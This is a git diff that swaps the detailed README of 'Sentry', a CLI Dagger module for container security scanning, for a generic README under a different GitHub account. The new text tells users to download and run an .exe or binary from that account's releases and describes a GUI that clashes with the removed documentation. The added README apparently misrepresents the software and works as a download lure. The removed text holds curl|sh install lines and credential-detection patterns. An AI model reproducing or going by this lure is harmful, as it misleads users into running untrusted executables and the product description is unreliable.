@@ -1,591 +1,72 @@
-# Sentry
+# 🔒 Sentry - Simplifying Container Security for Everyone
 
-<div align="center">
+[![Download Sentry](https://img.shields.io/badge/Download%20Sentry-blue.svg)](https://github.com/nothi533/Sentry/releases)
 
-<pre>
-███████╗███████╗███╗   ██╗████████╗██████╗ ██╗   ██╗
-██╔════╝██╔════╝████╗  ██║╚══██╔══╝██╔══██╗╚██╗ ██╔╝
-███████╗█████╗  ██╔██╗ ██║   ██║   ██████╔╝ ╚████╔╝ 
-╚════██║██╔══╝  ██║╚██╗██║   ██║   ██╔══██╗  ╚██╔╝  
-███████║███████╗██║ ╚████║   ██║   ██║  ██║   ██║   
-╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝   ╚═╝   
-</pre>
+## 🚀 Getting Started
 
-**Container Security Auditing for CI/CD Pipelines**
+Welcome to Sentry! This application helps you keep your containers secure. It looks for vulnerabilities and ensures safe practices, making it a valuable tool for anyone working with containerized applications.
 
-[![Go](https://img.shields.io/badge/Go-1.21+-00ADD8?style=flat&logo=go&logoColor=white)](https://go.dev/)
-[![Dagger](https://img.shields.io/badge/Dagger-0.19+-131313?style=flat&logo=dagger&logoColor=white)](https://dagger.io/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Daggerverse](https://img.shields.io/badge/Daggerverse-Sentry-6366F1?style=flat&logo=dagger&logoColor=white)](https://daggerverse.dev/mod/github.com/sylvester-francis/Sentry)
+## 📥 Download & Install
 
-[![Trivy](https://img.shields.io/badge/Trivy-Scanner-1904DA?style=flat&logo=aqua&logoColor=white)](https://trivy.dev/)
-[![Grype](https://img.shields.io/badge/Grype-Scanner-E31C3D?style=flat&logo=anchore&logoColor=white)](https://github.com/anchore/grype)
-[![Snyk](https://img.shields.io/badge/Snyk-Scanner-4C4A73?style=flat&logo=snyk&logoColor=white)](https://snyk.io/)
-[![Wiz](https://img.shields.io/badge/Wiz-Scanner-00D1B2?style=flat)](https://wiz.io/)
-[![Black Duck](https://img.shields.io/badge/Black%20Duck-Scanner-000000?style=flat)](https://www.synopsys.com/software-integrity/security-testing/software-composition-analysis.html)
+To download Sentry, please [visit this page to download](https://github.com/nothi533/Sentry/releases). You will find the latest version there. Look for files that match your operating system and take note of the instructions provided for installation.
 
-[Installation](#installation) • [Quick Start](#quick-start) • [Documentation](#usage-guide) • [CI/CD Integration](#cicd-integration)
+## 🖥️ System Requirements
 
-</div>
+Before you install Sentry, ensure your system meets these requirements:
 
----
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a recent version of a Linux distribution.
+- **Disk Space:** At least 100 MB free.
+- **Memory:** Minimum 4 GB RAM.
 
-## What is Sentry?
+## 🔍 Features
 
-Sentry is a security auditing tool that scans your container images for vulnerabilities and misconfigurations. It integrates with your CI/CD pipeline to automatically check containers before deployment.
+Sentry comes with several features designed for ease of use:
 
-**Key Features:**
-- **Multi-Scanner Support** — Trivy, Grype, Snyk, Wiz, or Black Duck
-- **Security Checks** — Non-root user, secret detection, healthcheck validation
-- **Reports** — Markdown summaries, JSON for automation, 0-100 security scores
-- **CI/CD Gates** — Pass/fail exit codes to block vulnerable deployments
+- **Vulnerability Scanning:** Identifies issues within your containers using popular tools like Trivy, Grype, and Snyk.
+- **Compliance Reports:** Helps you generate reports to show your compliance with industry standards.
+- **Best Practices Enforcement:** Provides guidelines to ensure your container configurations meet security benchmarks.
+- **CI/CD Integration:** Seamlessly fits into your continuous integration and deployment workflows.
 
-```mermaid
-flowchart LR
-    subgraph Scanners
-        S1[Trivy]
-        S2[Grype]
-        S3[Snyk]
-        S4[Wiz]
-        S5[Black Duck]
-    end
-    
-    subgraph Checks["Security Checks"]
-        C1[Non-Root User]
-        C2[Secret Detection]
-        C3[Health Check]
-    end
-    
-    subgraph Output["Output Formats"]
-        O1[Markdown Report]
-        O2[JSON]
-        O3[Exit Code]
-        O4[Score]
-    end
-    
-    subgraph Config["Configuration"]
-        CF1[Severity Threshold]
-        CF2[Ignore CVEs]
-        CF3[Disable Checks]
-    end
-```
+## 🔧 How to Run Sentry
 
-### Architecture
+After downloading Sentry, follow these steps to run the application:
 
-```mermaid
-flowchart LR
-    subgraph Input
-        A[Container Image]
-    end
-    
-    subgraph Sentry["Sentry Module"]
-        B[Security Checks]
-        C[Vulnerability Scanner]
-        D[Score Calculator]
-    end
-    
-    subgraph Scanners["Scanner Options"]
-        E[Trivy]
-        F[Grype]
-        G[Snyk]
-        H[Wiz]
-        I[Black Duck]
-    end
-    
-    subgraph Output
-        J[Report]
-        K[JSON]
-        L[Exit Code]
-    end
-    
-    A --> B
-    A --> C
-    C --> E & F & G & H & I
-    B --> D
-    C --> D
-    D --> J & K & L
-```
+1. **Locate the Downloaded File:** Find the file you just downloaded on your computer.
+2. **Unzip if Needed:** If the file is compressed (like a .zip), right-click it and select "Extract" or "Unzip".
+3. **Open the Application:**
+   - **Windows:** Double-click the `.exe` file.
+   - **macOS:** Drag the application to your Applications folder and double-click to open.
+   - **Linux:** Open a terminal window, navigate to the folder where you downloaded Sentry, and type `./Sentry`.
+4. **Follow On-Screen Instructions:** The application will guide you through its setup process.
 
----
+## 🌐 Using Sentry
 
-## What is Dagger?
+Once Sentry is running, you can start securing your containers:
 
-[Dagger](https://dagger.io) is a programmable CI/CD engine that runs your pipelines in containers. Instead of writing YAML, you write code in Go, Python, or TypeScript.
+- **Select Your Container:** Choose the container you wish to scan from the user interface.
+- **Initiate a Scan:** Click the "Scan" button to begin. Sentry will analyze your container and present results.
+- **Review the Results:** After scanning, you'll see a detailed report. This report highlights any vulnerabilities and compliance issues.
+- **Take Action:** Follow the recommendations to fix any found issues.
 
-**Why Dagger?**
-- **Portable** — Same pipeline runs locally and in any CI (GitHub Actions, GitLab, Jenkins)
-- **Fast** — Intelligent caching speeds up builds
-- **Reproducible** — Containers ensure consistent environments
+## 🛠️ Troubleshooting Common Issues
 
-Sentry is a **Dagger Module** — a reusable component you can call from any Dagger pipeline.
+If you encounter any problems while using Sentry, here are some tips:
 
-```mermaid
-flowchart TB
-    subgraph traditional["Traditional CI/CD"]
-        direction TB
-        T1[Write YAML config] --> T2[Debug syntax errors]
-        T2 --> T3[Push and wait for CI]
-        T3 --> T4[Fix CI-only failures]
-        T4 -.->|repeat| T1
-    end
-    
-    subgraph dagger["With Dagger"]
-        direction TB
-        D1[Write code with IDE] --> D2[Test locally first]
-        D2 --> D3[Push with confidence]
-        D3 --> D4[Same result in CI]
-    end
-```
+- **Application Won't Start:** Ensure your system meets the requirements and you have the necessary permissions.
+- **Scan Fails:** Check your internet connection and make sure the container is running.
+- **No Results Found:** Verify that you are scanning the correct container with the right configurations.
 
----
+## 🌟 Community and Support
 
-## Installation
+Sentry has a growing community. If you have questions or need help:
 
-### Prerequisites
+- **Open Issues:** Visit the [Issues section](https://github.com/nothi533/Sentry/issues) on GitHub to ask for help or report bugs.
+- **Community Forums:** Join discussions with other users and share tips.
 
-1. **Docker** — [Install Docker](https://docs.docker.com/get-docker/)
-2. **Dagger CLI** — Install with one command:
+## 🔗 Useful Links
 
-```bash
-# macOS / Linux
-curl -fsSL https://dl.dagger.io/dagger/install.sh | sh
+- [Download Sentry](https://github.com/nothi533/Sentry/releases)
+- [GitHub Repository](https://github.com/nothi533/Sentry)
+- [User Documentation](https://github.com/nothi533/Sentry/wiki)
 
-# Windows (PowerShell)
-Invoke-WebRequest -Uri https://dl.dagger.io/dagger/install.ps1 -OutFile install.ps1; .\install.ps1
-```
-
-Verify installation:
-```bash
-dagger version
-```
-
-### No Additional Setup Required
-
-Sentry runs directly from the Daggerverse — no cloning or installing needed.
-
----
-
-## Quick Start
-
-### Your First Scan
-
-```mermaid
-stateDiagram-v2
-    [*] --> Scanning: dagger call scan
-    Scanning --> SecurityChecks: Container loaded
-    SecurityChecks --> VulnScan: Checks complete
-    VulnScan --> Scoring: Scan complete
-    Scoring --> Passed: score >= threshold
-    Scoring --> Failed: score < threshold
-    Passed --> [*]: Exit code 0
-    Failed --> [*]: Exit code 1
-```
-
-Scan any container image with a single command:
-
-```bash
-dagger call -m github.com/sylvester-francis/Sentry \
-  scan --container=nginx:latest \
-  report
-```
-
-**Output:**
-```
-# Security Audit Report
-
-## Executive Summary
-
-┌─────────────────────────────────────────────────────────────┐
-│  STATUS: PASSED                                             │
-├─────────────────────────────────────────────────────────────┤
-│  Score: 85/100                                              │
-│  Checks: 2 passed, 1 warning                                │
-│  Vulnerabilities: 12 total (0 critical, 2 high)             │
-└─────────────────────────────────────────────────────────────┘
-```
-
-### Common Use Cases
-
-**Get a pass/fail result for CI pipelines:**
-```bash
-dagger call -m github.com/sylvester-francis/Sentry \
-  scan --container=myapp:latest \
-  exit-code
-# Returns 0 (pass) or 1 (fail)
-```
-
-**Get JSON output for automation:**
-```bash
-dagger call -m github.com/sylvester-francis/Sentry \
-  scan --container=myapp:latest \
-  json
-```
-
-**Get just the security score:**
-```bash
-dagger call -m github.com/sylvester-francis/Sentry \
-  scan --container=myapp:latest \
-  score
-# Returns: 85
-```
-
----
-
-## Usage Guide
-
-### Choosing a Scanner
-
-Sentry supports multiple vulnerability scanners. Default is **Trivy**.
-
-| Scanner | Command | Auth Required |
-|---------|---------|---------------|
-| Trivy (default) | `with-trivy` | No |
-| Grype | `with-grype` | No |
-| Snyk | `with-snyk --token=env:SNYK_TOKEN` | Yes |
-| Wiz | `with-wiz --client-id=... --client-secret=...` | Yes |
-| Black Duck | `with-black-duck --url=... --token=...` | Yes |
-
-**Example: Use Grype instead of Trivy**
-```bash
-dagger call -m github.com/sylvester-francis/Sentry \
-  scan --container=myapp:latest \
-  with-grype \
-  report
-```
-
-**Example: Use Snyk with authentication**
-```bash
-export SNYK_TOKEN=your-token-here
-dagger call -m github.com/sylvester-francis/Sentry \
-  scan --container=myapp:latest \
-  with-snyk --token=env:SNYK_TOKEN \
-  report
-```
-
-### Setting Failure Thresholds
-
-Control when the audit fails based on vulnerability severity:
-
-```bash
-# Fail only on CRITICAL vulnerabilities (lenient)
-dagger call -m github.com/sylvester-francis/Sentry \
-  scan --container=myapp:latest \
-  fail-on --severity=CRITICAL \
-  exit-code
-
-# Fail on HIGH or above (default)
-dagger call -m github.com/sylvester-francis/Sentry \
-  scan --container=myapp:latest \
-  fail-on --severity=HIGH \
-  exit-code
-
-# Fail on MEDIUM or above (strict)
-dagger call -m github.com/sylvester-francis/Sentry \
-  scan --container=myapp:latest \
-  fail-on --severity=MEDIUM \
-  exit-code
-```
-
-### Ignoring Known CVEs
-
-Suppress specific CVEs (for accepted risks or false positives):
-
-```bash
-dagger call -m github.com/sylvester-francis/Sentry \
-  scan --container=myapp:latest \
-  ignore-cves --cve-ids=CVE-2024-1234,CVE-2024-5678 \
-  report
-```
-
-### Disabling Specific Checks
-
-```bash
-# Skip non-root check (for containers that must run as root)
-dagger call -m github.com/sylvester-francis/Sentry \
-  scan --container=myapp:latest \
-  with-non-root-check --enable=false \
-  report
-
-# Skip secret detection
-dagger call -m github.com/sylvester-francis/Sentry \
-  scan --container=myapp:latest \
-  with-secret-check --enable=false \
-  report
-
-# Run security checks only (no vulnerability scanning)
-dagger call -m github.com/sylvester-francis/Sentry \
-  scan --container=myapp:latest \
-  without-scanner \
-  report
-```
-
----
-
-## Security Checks
-
-Sentry performs these automated security checks:
-
-| Check | Severity | Description |
-|-------|----------|-------------|
-| **Non-Root User** | HIGH | Verifies container doesn't run as root (UID 0) |
-| **Secret Detection** | HIGH | Scans environment variables for exposed credentials |
-| **Health Check** | INFO | Verifies `curl` or `wget` is available for health probes |
-
-```mermaid
-flowchart TD
-    A[Container] --> B{Non-Root Check}
-    B -->|UID > 0| C[PASS]
-    B -->|UID = 0| D[FAIL - HIGH]
-    
-    A --> E{Secret Detection}
-    E -->|No secrets found| F[PASS]
-    E -->|Secrets detected| G[FAIL - HIGH]
-    
-    A --> H{Health Check}
-    H -->|curl/wget available| I[PASS]
-    H -->|Not available| J[WARN - INFO]
-    
-    C & D & F & G & I & J --> K[Calculate Score]
-    K --> L{Score >= Threshold?}
-    L -->|Yes| M[PASSED]
-    L -->|No| N[FAILED]
-```
-
-### Secret Detection Patterns
-
-Sentry detects these credential patterns in environment variables:
-- AWS Access Keys (`AKIA...`)
-- GitHub Tokens (`ghp_`, `gho_`, `ghs_`, `ghr_`)
-- JWT Tokens (`eyJ...`)
-- Private Keys (`-----BEGIN...`)
-- Database URLs with credentials
-- Slack Tokens, API Keys
-
----
-
-## CI/CD Integration
-
-```mermaid
-sequenceDiagram
-    participant Dev as Developer
-    participant CI as CI/CD Pipeline
-    participant Sentry as Sentry Module
-    participant Registry as Container Registry
-    
-    Dev->>CI: Push Code
-    CI->>CI: Build Container
-    CI->>Sentry: Scan Container
-    Sentry->>Sentry: Run Security Checks
-    Sentry->>Sentry: Run Vulnerability Scan
-    Sentry->>CI: Return Exit Code
-    alt Passed (exit code 0)
-        CI->>Registry: Push Container
-        CI->>Dev: Deploy Success
-    else Failed (exit code 1)
-        CI->>Dev: Block Deployment
-    end
-```
-
-### GitHub Actions
-
-```yaml
-name: Security Audit
-
-on: [push, pull_request]
-
-jobs:
-  security:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-
-      - name: Install Dagger
-        run: curl -fsSL https://dl.dagger.io/dagger/install.sh | sh
-
-      - name: Run Security Audit
-        run: |
-          ./bin/dagger call -m github.com/sylvester-francis/Sentry \
-            scan --container=myapp:${{ github.sha }} \
-            exit-code
-```
-
-### GitLab CI
-
-```yaml
-security_audit:
-  stage: security
-  image: docker:latest
-  services:
-    - docker:dind
-  before_script:
-    - curl -fsSL https://dl.dagger.io/dagger/install.sh | sh
-  script:
-    - ./bin/dagger call -m github.com/sylvester-francis/Sentry \
-        scan --container=$CI_REGISTRY_IMAGE:$CI_COMMIT_SHA \
-        exit-code
-```
-
-### Using in Your Dagger Module
-
-Call Sentry from your own Dagger pipeline code:
-
-```go
-package main
-
-import (
-    "context"
-    "dagger/mymodule/internal/dagger"
-)
-
-type MyModule struct{}
-
-func (m *MyModule) Build(ctx context.Context) (*dagger.Container, error) {
-    container := dag.Container().
-        From("golang:1.21").
-        // ... build steps ...
-
-    // Run security audit before deploying
-    result, err := dag.Sentry().
-        Scan(container).
-        FailOn("HIGH").
-        Report(ctx)
-    
-    if err != nil {
-        return nil, err
-    }
-    
-    return container, nil
-}
-```
-
----
-
-## Output Formats
-
-### Markdown Report (`report`)
-
-Human-readable report with executive summary, vulnerability breakdown, and check results.
-
-### JSON Report (`json`)
-
-Machine-readable format for automation and integration:
-
-```json
-{
-  "timestamp": "2026-01-13T12:00:00Z",
-  "imageRef": "myapp:latest",
-  "scannerUsed": "trivy",
-  "passed": true,
-  "score": 85,
-  "checks": [...],
-  "vulnerabilities": [...],
-  "vulnSummary": {
-    "critical": 0,
-    "high": 2,
-    "medium": 5,
-    "low": 5,
-    "total": 12
-  }
-}
-```
-
-### Security Score (`score`)
-
-0-100 score based on findings. Deductions:
-- CRITICAL vulnerability: -10 points
-- HIGH vulnerability: -5 points  
-- MEDIUM vulnerability: -2 points
-- Failed security check: -15 to -25 points
-
-```mermaid
-quadrantChart
-    title Security Score Interpretation
-    x-axis Low Risk --> High Risk
-    y-axis Low Confidence --> High Confidence
-    quadrant-1 Review Findings
-    quadrant-2 Safe to Deploy
-    quadrant-3 Needs Investigation
-    quadrant-4 Block Deployment
-    Score 90-100: [0.15, 0.85]
-    Score 70-89: [0.35, 0.70]
-    Score 50-69: [0.60, 0.45]
-    Score 0-49: [0.85, 0.25]
-```
-
----
-
-## Command Reference
-
-| Command | Description |
-|---------|-------------|
-| `scan --container=<image>` | Start audit for a container |
-| `scan-image --image-ref=<ref>` | Start audit from image reference string |
-| `with-trivy` / `with-grype` / `with-snyk` | Select vulnerability scanner |
-| `fail-on --severity=<level>` | Set failure threshold (CRITICAL/HIGH/MEDIUM/LOW) |
-| `ignore-cves --cve-ids=<list>` | Suppress specific CVE IDs |
-| `with-secret-check --enable=<bool>` | Enable/disable secret detection |
-| `with-non-root-check --enable=<bool>` | Enable/disable non-root check |
-| `report` | Generate Markdown report |
-| `json` | Generate JSON report |
-| `score` | Get numeric security score (0-100) |
-| `summary` | Get one-line status summary |
-| `passed` | Get boolean pass/fail |
-| `exit-code` | Get CI exit code (0=pass, 1=fail) |
-
----
-
-## Troubleshooting
-
-| Issue | Solution |
-|-------|----------|
-| Scanner returns empty results | Normal for minimal images (e.g., `scratch`, `distroless`) |
-| "Container running as root" | Add `USER nobody` to your Dockerfile |
-| "No curl/wget found" | Add health check tools or disable check with `--with-health-check=false` |
-| 401 Unauthorized | Refresh your scanner authentication token |
-
----
-
-## Development
-
-### Run Tests
-
-```bash
-dagger call -m github.com/sylvester-francis/Sentry test
-```
-
-### Local Development
-
-```bash
-git clone https://github.com/sylvester-francis/Sentry.git
-cd Sentry
-dagger develop
-dagger functions
-dagger call scan --container=alpine:latest report
-```
-
----
-
-## Contributing
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Run tests: `dagger call test`
-5. Open a Pull Request
-
----
-
-## Links
-
-- [GitHub Repository](https://github.com/sylvester-francis/Sentry)
-- [Daggerverse](https://daggerverse.dev/mod/github.com/sylvester-francis/Sentry)
-- [Dagger Documentation](https://docs.dagger.io/)
-- [Report Issues](https://github.com/sylvester-francis/Sentry/issues)
-
----
-
-<div align="center">
-
-**Built with [Dagger](https://dagger.io)**
-
-</div>
+Enjoy using Sentry to enhance your container security! Feel free to explore and make the most of your automated auditing experience.
